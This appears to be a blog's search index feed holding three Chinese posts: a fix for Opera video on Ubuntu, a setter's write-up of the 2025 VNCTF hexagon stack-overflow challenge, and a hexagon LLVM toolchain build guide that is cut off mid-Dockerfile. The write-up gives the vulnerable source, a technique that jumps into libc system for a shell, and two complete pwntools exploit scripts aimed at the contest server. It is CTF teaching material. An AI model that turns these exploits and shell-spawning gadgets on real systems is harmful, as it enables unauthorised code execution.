<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>解决ubuntu桌面中opera浏览无法支持html5的问题</title>
      <link href="/2025/ubuntu-opera-html5/"/>
      <url>/2025/ubuntu-opera-html5/</url>
      
        <content type="html"><![CDATA[<p>昨天给一台笔记本装了一个纯净完整的Ubuntu24.04，中间遇到了很多软件适配问题。本文提出的问题截止目前为止，网上找不到有效的解决方案，因为ubuntu24太新了，很多包已经失效了。</p><p>当在ubuntu中用Opera浏览器打开B站看视频的时候会发现播放器提示“该浏览器不支持html5，请更换浏览器”等字样。这是因为opera在安装时有一个库没有安装。opera的内核也是基于谷歌的，因此解决方案是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install chromium-browser</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">cp</span> /snap/chromium/3060/usr/lib/chromium-browser/libffmpeg.so /usr/lib/x86_64-linux-gnu/opera/libffmpeg.so</span></span><br></pre></td></tr></table></figure><p>然后重启opera浏览器就OK了。其实网上有旧版本对于opera无法播放的解决办法，都是给opera补这个缺失的libc，但是旧版的谷歌浏览器安装好后lib文件在<code>/usr/lib/chromium-browser</code>，新版的位置发生了很大的改变，因此记录一下。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『2025VNCTF』hexagon出题小记&amp;&amp;hexagon架构一种新的利用方式</title>
      <link href="/2025/2025vnctf-hexagon/"/>
      <url>/2025/2025vnctf-hexagon/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前记"><a href="#0x00-前记" class="headerlink" title="0x00 前记"></a>0x00 前记</h2><p>大佬们轻点喷qaq</p><p>这是一道hexagon架构的pwn题，比较冷门，但漏洞很简单就是一个栈溢出。第一次见hexagon架构的pwn题是在2024年的geekctf上，具体关于hexagon程序运行、调试、栈迁移打法复现，可以看我的<a href="https://c-lby.top/2024/2024geekctf-stkbof/">这篇博客</a>（如果你是在做题的时候现学查到的先知那篇文章，没错那也是我的），这篇文章里其实还记录了新利用的发现，但是在比赛期间被我锁上了。</p><p>鉴于VNCTF是招新赛，也算是半个新生赛了（确信），所以题目难度降了又降。从一开始的极少栈空间，到给多一定栈空间可以有机会通过多次栈迁移攻击，到最后连log都给出来了，免去了选手爆破栈地址的痛苦，十个左右的解是符合预期的。</p><p>所以这道题总共有两种解法，虽然我很希望有选手能够通过除了栈迁移之外的打法做出这道题，但是遗憾的的是似乎大家都参照了先知的文章用栈迁移打通的。栈迁移打法的脚本在文章最后。</p><h2 id="0x01-程序运行与调试"><a href="#0x01-程序运行与调试" class="headerlink" title="0x01 程序运行与调试"></a>0x01 程序运行与调试</h2><ol><li>首先qemu-user的安装是有必要的，里面包含了qemu-hexagon，这是程序运行的基础设施</li><li>第二步是将libc链接到&#x2F;lib里<code>sudo ln -sf libc.so /lib/ld-musl-hexagon.so.1</code></li><li>第三步运行程序qemu-hexagon .&#x2F;main就能运行起来了</li><li>调试程序实测gdb-mutilarch用不了，所以建议不折腾用qemu本身的调试功能来调试，这里给出其中一种信息较详细的调试命令<code>qemu-hexagon -L libc -d in_asm,exec,cpu,page,nochain -singlestep -dfilter 0x20420+0xc0 -strace -D ./log ./main</code></li><li>题目没给出源码，如果要在IDA反汇编看代码，需要借助<a href="https://github.com/n-o-o-n/idp_hexagon/releases/download/v5.4/hexagon-ida83-v5.4.7z">插件</a></li></ol><h2 id="0x02-源码"><a href="#0x02-源码" class="headerlink" title="0x02 源码"></a>0x02 源码</h2><p>按照国际惯例先给出源码，其实也非常简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> vul_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> pad;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> key;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    read(<span class="number">0</span>, vul_buf, <span class="number">16</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/ctf/log&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome back, hexagon player!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-新的利用方式"><a href="#0x03-新的利用方式" class="headerlink" title="0x03 新的利用方式"></a>0x03 新的利用方式</h2><p>这可能并不能是新的利用方式，毕竟这种形式的类ogg在各个libc里都挺常见的，只是用的比较少。但至少在hexagon架构里有一定好处，hexagon的指令集中是没有pop和push的，所以不能像x86_64那样构造ROP直接控制寄存器，而是要通过栈（迁移）来控制寄存器。在<strong>栈容量较小的时候</strong>还是太吃操作了，主包还有没有更简单的方法。有的兄弟有的。</p><p>我们在libc.so中先找到&#x2F;bin&#x2F;sh，然后看他的引用，跳到system函数上，可以看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:000BE7C0                 &#123; r3 = memw(fp + #var_42C) &#125;</span><br><span class="line">.text:000BE7C4                 &#123; r0 = add(pc, ##aSh@pcrel) &#125; // &quot;sh&quot;</span><br><span class="line">.text:000BE7CC                 &#123; memw(fp + #var_420) = r0 &#125;</span><br><span class="line">.text:000BE7D0                 &#123; r0 = add(pc, ##aC_0@pcrel) &#125; // &quot;-c&quot;</span><br><span class="line">.text:000BE7D8                 &#123; memw(fp + #var_41C) = r0 &#125;</span><br><span class="line">.text:000BE7DC                 &#123; r0 = memw(fp + #var_10) &#125;</span><br><span class="line">.text:000BE7E0                 &#123; memw(fp + #var_418) = r0 &#125;</span><br><span class="line">.text:000BE7E4                 &#123; r2 = #0 &#125;</span><br><span class="line">.text:000BE7E8                 &#123; memw(fp + #var_414) = r2 &#125;</span><br><span class="line">.text:000BE7EC                 &#123; r0 = add(pc, ##_GLOBAL_OFFSET_TABLE_@pcrel) &#125;</span><br><span class="line">.text:000BE7F4                 &#123; r0 = memw(r0 + ##-0x102F4) &#125;</span><br><span class="line">.text:000BE7FC                 &#123; r5 = memw(r0) &#125;</span><br><span class="line">.text:000BE800                 &#123; r1 = add(pc, ##aBinSh@pcrel) &#125; // &quot;/bin/sh&quot;</span><br><span class="line">.text:000BE808                 &#123; r0 = add(fp, #-0x14) &#125;</span><br><span class="line">.text:000BE80C                 &#123; r4 = add(fp, #-0x420) &#125;</span><br><span class="line">.text:000BE810                 &#123; call posix_spawn &#125;</span><br><span class="line">.text:000BE818                 &#123; r1 = r0 &#125;</span><br><span class="line">.text:000BE81C                 &#123; r0 = memw(fp + #var_42C) &#125;</span><br><span class="line">.text:000BE820                 &#123; memw(fp + #var_2C0) = r1 &#125;</span><br><span class="line">.text:000BE824                 &#123; call posix_spawnattr_destroy &#125;</span><br><span class="line">.text:000BE82C                 &#123; r0 = memw(fp + #var_2C0) &#125;</span><br><span class="line">.text:000BE830                 &#123; p0 = cmp.eq(r0, #0) &#125;</span><br><span class="line">.text:000BE834                 &#123; p0 = not(p0) &#125;</span><br><span class="line">.text:000BE838                 &#123; if (p0) jump loc_BE8A4 &#125;</span><br><span class="line">.text:000BE83C                 &#123; jump loc_BE840 &#125;</span><br><span class="line">.text:000BE840 // ---------------------------------------------------------------------------</span><br><span class="line">.text:000BE840</span><br><span class="line">.text:000BE840 loc_BE840:                              // CODE XREF: system+1CC↑j</span><br><span class="line">.text:000BE840                 &#123; jump loc_BE844 &#125;</span><br><span class="line">.text:000BE844 // ---------------------------------------------------------------------------</span><br><span class="line">.text:000BE844</span><br><span class="line">.text:000BE844 loc_BE844:                              // CODE XREF: system:loc_BE840↑j</span><br><span class="line">.text:000BE844                                         // system:loc_BE89C↓j</span><br><span class="line">.text:000BE844                 &#123; r0 = memw(fp + #var_14) &#125;</span><br><span class="line">.text:000BE848                 &#123; r1 = add(fp, #-0x2BC) &#125;</span><br><span class="line">.text:000BE84C                 &#123; r2 = #0 &#125;</span><br><span class="line">.text:000BE850                 &#123; call waitpid &#125;</span><br></pre></td></tr></table></figure><p>其实就是system函数执行命令的逻辑是<code>/bin/sh -c xxxx</code>，而这个xxxx命令会从fp-0x10中取。那么我只需要满足以下三点就能执行<code>/bin/sh -c /bin/sh</code>了</p><ol><li>栈上写0x3FED19F7（libcbase&#x3D;0x3FEC0000，则0x3FED19F7是&#x2F;bin&#x2F;sh字符串）</li><li>控制好fp（类似rbp寄存器）使得[fp-0x10]精准命中栈上的0x3FED19F7</li><li>劫持返回地址为libcbase+0xBE7C0，也就是上面这个gadget的开始（不同版本的libc偏移可能存在差异）</li></ol><p>也就是说我们只需要得知栈地址和libc地址就能轻松getshell，而这两个地址在qemu环境下一点也不难得知，更何况本题给出了log，log中记载了当次程序运行的所有系统调用情况，我们通过查看read调用就能找到栈地址。libc地址同理，有很多方法可以获取。这样的方法免去了调试栈迁移的痛苦。</p><p>hexagon这道题其实有点就题出题的意思在里面，给了scanf就是为了给选手输入0x3FED19F7到[fp-0x10]的（赤裸裸的明示）。实际上只要题目能够输入4*3字节并能覆盖fp和返回地址，就能使用这种方法getshell，或者执行其他命令。</p><h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&#x27;qemu-hexagon&#x27;, &#x27;-L&#x27;, &#x27;libc&#x27;, &#x27;-d&#x27;, &#x27;in_asm,exec,cpu,nochain&#x27;, &#x27;-singlestep&#x27;,</span></span><br><span class="line"><span class="comment">#             &#x27;-dfilter&#x27;, &#x27;0x20420+0xc0&#x27;, &#x27;-strace&#x27;, &#x27;-D&#x27;, &#x27;./log&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line">r = remote(<span class="string">&#x27;node.vnteam.cn&#x27;</span>, <span class="number">43815</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x4080e9d8</span> <span class="comment"># 栈地址在ubuntu22的qemu下可能会变</span></span><br><span class="line">libc_base = <span class="number">0x3FEC0000</span> <span class="comment"># libc地址不会变</span></span><br><span class="line">binsh = libc_base+<span class="number">0x119f7</span></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(binsh).encode())</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)*<span class="number">2</span> + p32(stack+<span class="number">8</span>)+p32(libc_base+<span class="number">0xBE7C0</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x05-栈迁移方法的EXP"><a href="#0x05-栈迁移方法的EXP" class="headerlink" title="0x05 栈迁移方法的EXP"></a>0x05 栈迁移方法的EXP</h2><p>出题人最近比较忙所以直接贴出本题一血的栈迁移脚本。绝对不是因为出题人懒哟。绝对不是哟。</p><p>为了不误导大家，脚本中原先存在的部分注释被删掉了，请大家自行调试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;neww&#x27;</span>]</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">all_logs = []</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment"># sh = process(filename)</span></span><br><span class="line">    <span class="comment"># sh = process([&#x27;qemu-hexagon&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line">    sh = process([<span class="string">&#x27;qemu-hexagon&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-singlestep&#x27;</span>, <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20460+0x40&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./main&#x27;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&#x27;qemu-hexagon&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;./main&#x27;])</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node.vnteam.cn&#x27;</span>, <span class="number">47998</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">params=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">for</span> an_log <span class="keyword">in</span> all_logs:</span><br><span class="line">        success(an_log)</span><br><span class="line">    pid = util.proc.pidof(sh)[<span class="number">0</span>]</span><br><span class="line">    gdb.attach(pid, params)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_info</span>(<span class="params">name, addr</span>):</span><br><span class="line">    output_log = <span class="string">&#x27;&#123;&#125; =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(addr))</span><br><span class="line">    all_logs.append(output_log)</span><br><span class="line">    success(output_log)</span><br><span class="line"></span><br><span class="line">stack_addr = <span class="number">0x4080f1c8</span></span><br><span class="line">libc_base= <span class="number">0x3FEC0000</span></span><br><span class="line">gadget1 = <span class="number">0x20534</span> <span class="comment"># r0 = memw(fp + #var_8) dealloc_return</span></span><br><span class="line">gadget2 = libc_base + <span class="number">0xDB2CC</span> <span class="comment"># r0 = memw(fp + #var_4) dealloc_return</span></span><br><span class="line">gadget3 = libc_base + <span class="number">0x54630</span> <span class="comment"># r0 = memw(fp -0x10 ) dealloc_return</span></span><br><span class="line">ret = <span class="number">0x20538</span></span><br><span class="line">bss = <span class="number">0x406d0</span></span><br><span class="line">bss = stack_addr</span><br><span class="line">target = <span class="number">0x1039E</span></span><br><span class="line">call_system = <span class="number">0x2048C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">str</span>(<span class="number">0x1000</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Welcome back, hexagon player!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss-<span class="number">0x30</span>+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p32(bss-<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x4080f198</span>) + <span class="string">b&#x27;bbbb&#x27;</span> + p32(bss-<span class="number">0x10</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(<span class="number">0x2048C</span>) + p32(bss-<span class="number">0x10</span>) + p32(gadget3)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x30 /bin/sh          </span></span><br><span class="line"><span class="comment"># bss-0x2c xxxx</span></span><br><span class="line"><span class="comment"># bss-0x28 bss-0x20+8</span></span><br><span class="line"><span class="comment"># bss-0x24 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x20 0x4080f198       </span></span><br><span class="line"><span class="comment"># bss-0x1c bbbb</span></span><br><span class="line"><span class="comment"># bss-0x18 bss-0x10+8</span></span><br><span class="line"><span class="comment"># bss-0x14 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x10 sh          </span></span><br><span class="line"><span class="comment"># bss-0xc  0xdeadbeaf</span></span><br><span class="line"><span class="comment"># bss-8    bss-0x10</span></span><br><span class="line"><span class="comment"># bss-4    gadget3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss      aaaa              </span></span><br><span class="line"><span class="comment"># bss+4    aaaa</span></span><br><span class="line"><span class="comment"># bss+8    bss-0x30+8</span></span><br><span class="line"><span class="comment"># bss+0xc  start_read</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
            <tag> hexagon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexagon LLVM编译环境搭建</title>
      <link href="/2024/hexagon-toolchain-env/"/>
      <url>/2024/hexagon-toolchain-env/</url>
      
        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><a href="https://github.com/quic/toolchain_for_hexagon">toolchain for hexagon</a>这是高通官方的hexagon架构编译工具链源码。是的没错你要自己编译这个环境。当然github上面也给出了编译好的release版本，开箱即用。经历一些波折之后我觉得似乎还是开箱即用比较方便（</p><p>搭建步骤大致如下：</p><ol><li>下载依赖项源码</li><li>设置依赖项源码路径的环境变量</li><li>逐项编译</li></ol><h2 id="在本地构建"><a href="#在本地构建" class="headerlink" title="在本地构建"></a>在本地构建</h2><p>local文件夹下的README有提到方法</p><p>首先要先安装依赖项，这些依赖在dockerfile中有提到</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bison \</span><br><span class="line">cmake \</span><br><span class="line">flex \</span><br><span class="line">rsync \</span><br><span class="line">wget \</span><br><span class="line">build-essential \</span><br><span class="line">python-is-python3 \</span><br><span class="line">python3.<span class="number">8</span> \</span><br><span class="line">python3.<span class="number">8</span>-venv \</span><br><span class="line">curl \</span><br><span class="line">xz-utils \</span><br><span class="line">zstd \</span><br><span class="line">ca-certificates \</span><br><span class="line">ccache \</span><br><span class="line">git \</span><br><span class="line">software-properties-common \</span><br><span class="line">bc \</span><br><span class="line">ninja-build \</span><br><span class="line">cpio \</span><br><span class="line">python3-psutil \</span><br><span class="line">unzip</span><br></pre></td></tr></table></figure><p>cmake如果直接用apt管理器下载版本会太旧，因此需要从kitware下载。后面将在容器里搭建会讲到。</p><p>然后运行脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./get-src-repos.sh $&#123;PWD&#125; $&#123;PWD&#125;/install/manifest     &lt;-获取源码</span><br><span class="line"></span><br><span class="line">cd llvm-test-suite</span><br><span class="line">git am ../test-suite-patches/0001-Add-cycle-read-for-hexagon.patch   &lt;-打个补丁</span><br><span class="line"></span><br><span class="line">TOOLCHAIN_INSTALL=$&#123;PWD&#125;/install \</span><br><span class="line">ROOT_INSTALL=$&#123;PWD&#125;/rootfs \</span><br><span class="line">ARTIFACT_BASE=$&#123;PWD&#125;/artifacts \</span><br><span class="line">ARTIFACT_TAG=main \</span><br><span class="line">    ./build-toolchain.sh     &lt;-设置变量后运行编译脚本</span><br></pre></td></tr></table></figure><p>编译好之后可以运行<code>test-toolchain.sh</code>来检验，变量在build脚本的基础上加多一个<code>TEST_TOOLCHAIN=1</code>即可。然后就可以使用<code>hexagon-unknown-linux-musl-clang(++)</code>来编译项目了。默认是没有开PIE和canary的，partial relro。虽然hexagon是有类似保护机制的，还有待探究。</p><h2 id="在容器构建"><a href="#在容器构建" class="headerlink" title="在容器构建"></a>在容器构建</h2><p>需要设置一个变量<code>ARTIFACT_TAG</code>，可以划分版本。比如现在hexagon最新可稳定支持的版本是19.1.5。不同版本的源码可以在项目分支tags中找到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export ARTIFACT_TAG=19.1.5</span><br><span class="line"></span><br><span class="line">./build-in-container.sh</span><br></pre></td></tr></table></figure><p>这样就可以自动构建了。编译时间很长需要耐心等待。</p><p>dockerfile由于网络问题，有些地方需要进行修改。以下是我给出可以在国内正常下载的修改过的dockerfile：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>@sha256:<span class="number">6</span>d8d9799fe6ab3221965efac00b4c34a2bcc102c086a58dff9e19a08b913c7ef</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> HOST_CLANG_VER <span class="number">19</span></span><br><span class="line"><span 